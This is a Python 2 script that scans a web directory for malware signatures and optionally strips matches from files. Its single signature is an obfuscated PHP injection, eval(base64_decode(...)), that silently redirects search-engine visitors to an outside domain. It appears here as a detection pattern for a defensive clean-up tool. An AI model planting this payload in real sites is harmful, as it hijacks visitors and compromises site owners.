#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Скрипт поиска и удаления вредоносных вставок по статичным сигнатурам.
# Перед использованием необходимо изменить массив сигнатур (signatures)
# Запуск: python find-virus.py /dir/for/search clean
# Если не указан параметр clean скрипт произведёт только поиск вставок.
# Авторы: Антон Кузьмин | anton.kuzmin.russia@gmail.com | http://anton-kuzmin.blogspot.com/
#         Алексей Мещеряков | tank1st99@gmail.com

import sys
import os

def help():
    print "================================================================================"
    print "Script for search and delete viruses in web-files by signatures."
    print "Before use you must change source of this script for write signatures!"
    print "Usage: python find-virus.py /dir/for/search clean";
    print "If you don`t write 'clean' in params, script will only find suspiciousness files."
    print "(c) Anton Kuzmin         | anton.kuzmin.russia@gmail.com | http://anton-kuzmin.blogspot.com/"
    print "(c) Alexey Meshcheryakov | tank1st99@gmail.com           | "
    print "================================================================================"

signatures = {'test': 'eval(base64_decode("DQoNCg0KZXJyb3JfcmVwb3J0aW5nKDApOw0KJG5jY3Y9aGVhZGVyc19zZW50KCk7DQppZiAoISRuY2N2KXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YT0kX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107DQppZiAoc3RyaXN0cigkcmVmZXJlciwidHdpdHRlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29vZ2xlIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInlhbmRleC5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJtYWlsLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwiYXNrLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm1zbiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vayIpKSB7DQoJaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsJCQ0KCQloZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vZ29vb29nbGUub3NhLnBsLyIpOw0KCQlleGl0KCk7DQoJfQ0KfQ0KfQ=="));'}
sizeLimit = 10000000;

def main(argv=None):
    if argv is None:
        argv = sys.argv
    if len(argv) < 2:
        help()
        return
    
    searchPath = sys.argv[1]
    if not os.path.exists(searchPath):
        print "Path "+searchPath+" not exists!"
        return
    
    bigSize = []
    notReadable = []
    notWritable = []
    
    for root, dirs, files in os.walk(searchPath):
        for name in files:
            filename = os.path.join(root, name)
            if os.path.getsize(filename) > sizeLimit:
                bigSize.append(filename)
            else:
                try:
                    f = open (filename, "r")
                except IOError:
                    notReadable.append(filename)
                else:
                    content = f.read()
                    f.close()
                    for sig in signatures.keys():
                        count_sig = content.count(signatures[sig])
                        if count_sig > 0:
                            print filename+" (Sig:"+sig+"|Count:"+str(count_sig)+")"
                            if len(argv) == 3 and argv[2] == 'clean':
                                content = content.replace(signatures[sig], "\n/* HERE WAS VIRUS */\n")
                                try:
                                    f = open (filename, "w")
                                    f.write(content)
                                except IOError:
                                    notWritable.append(filename)
                                else:
                                    f.close()

    if len(bigSize) != 0:
        print "Files with very big size:"
        for filename in bigSize:
            print "    "+filename
    if len(notReadable) != 0:
        print "Not readable files:"
        for filename in notReadable:
            print "    "+filename
    if len(notWritable) != 0:
        print "Not writable files:"
        for filename in notWritable:
            print "    "+filename

if __name__ == '__main__':
    main()
